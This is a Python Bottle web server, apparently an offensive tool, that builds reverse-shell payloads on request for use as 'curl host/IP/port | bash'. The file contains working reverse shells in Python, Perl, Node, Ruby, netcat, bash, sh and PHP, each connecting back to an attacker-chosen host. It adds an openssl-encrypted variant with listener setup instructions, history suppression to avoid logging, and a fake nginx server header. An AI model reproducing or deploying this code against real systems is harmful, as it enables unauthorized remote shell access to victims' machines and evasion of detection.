#!/usr/bin/python


from bottle import Bottle, template, request, redirect, static_file, response, abort
import traceback, os


app = application = Bottle()


SHELLS = [['python', """printf 'import os;import pty;import socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%(host)s",%(port)s));s.sendall("%(msg)s");os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv("HISTFILE","/dev/null");pty.spawn("/bin/%(sh)s");s.close()' | python"""],
          ['python3', """printf 'import os;import pty;import socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%(host)s",%(port)s));s.sendall(bytes("%(msg)s","UTF-8"));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv("HISTFILE","/dev/null");pty.spawn("/bin/%(sh)s");s.close()' | python3"""],
          ['perl', """printf 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in(%(port)s,inet_aton("%(host)s")))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");print("%(msg)s");exec("/bin/%(sh)s -i");};' | perl"""],
          ['node', """printf 'var net=require("net"),sh=require("child_process").exec("/bin/%(sh)s -i");var client=new net.Socket();client.connect(%(port)s, "%(host)s", function(){client.write("%(msg)s");client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});' | node"""],
          ['ruby', """printf 'require "socket";s=Socket.new 2,1;s.connect Socket.sockaddr_in %(port)s, "%(host)s";s.write("%(msg)s");[0,1,2].each { |fd| syscall 33, s.fileno, fd };exec "/bin/%(sh)s -i"' | ruby"""],
          ['nc', """rm '/tmp/  ';mkfifo '/tmp/  ';cat '/tmp/  '|/bin/%(sh)s -i 2>&1|nc %(host)s %(port)s >'/tmp/  '"""],
          ['bash', """bash -i >& /dev/tcp/%(host)s/%(port)s 0>&1"""],
          ['sh', """sh -i >& /dev/tcp/%(host)s/%(port)s 0>&1"""],
          ['php', """php <(printf '\<?php $sock=fsockopen("%(host)s",%(port)s);fwrite($sock,"%(msg)s");exec("/bin/%(sh)s -i <&3 >&3 2>&3");?>')"""],
          ]

SSL_SHELL = "mkfifo '/tmp/   '; bash -i < '/tmp/   ' 2>&1 | openssl s_client -quiet -connect %(host)s:%(port)s 2>/dev/null > '/tmp/   '; rm '/tmp/   '"
# generate cert:
# openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 -subj "/C=NL/ST=null/L=null/O=null/CN=null" -keyout server.key -out server.cer
# listener:
# openssl s_server -quiet -key server.key  -cert server.cer -port <port>


@app.get('/<filename:re:(files)/.*>')
def files(filename):
    response = static_file(filename, root='./')
    response.set_header('Server', 'nginx')
    response.set_header('Cache-Control', 'no-cache')
    return response

@app.get('/<host>/<port>') # Usage: curl localhost:8081/10.10.10.21/4444 | bash
def genshell(host, port):
    response.set_header('Content-Type', 'text/plain')
    try:
        sh = 'bash'
        if '+' in host:
            host, sh = host.split('+')
        script = ''
        for shell in SHELLS:
            msg = "%s reverse shell received!\\\\n"%(shell[0])
            payload = shell[1]%({'host':host, 'port':port, 'sh':sh, 'msg': msg})
            script += """
if command -v %(shell)s &>/dev/null; then
    %(payload)s
    exit;
fi"""%({'shell': shell[0], 'payload': payload})
        return script
            
    except Exception as err:
        #traceback.print_exc()
        return

@app.get('/ssl/<host>/<port>')
def sslshell(host, port):
    return SSL_SHELL%({'host': host, 'port': port})

@app.error(404)
def error404(error):
    return '<pre>404: Not Found</pre>'



if __name__ == '__main__':
    print("Usage:")
    print("curl http://thishost/[ip_connect_back]/[port_connect_back] | bash")
    print("curl http://thishost/ssl/[ip_connect_back]/[port_connect_back] | bash\n")
    print("SSL Listener:")
    print('Generate cert: openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 -subj "/C=NL/ST=null/L=null/O=null/CN=null" -keyout server.key -out server.cer')
    print("Start listener: openssl s_server -quiet -key server.key  -cert server.cer -port <port>\n")
    app.run(host='0.0.0.0', port=8081, debug=False)
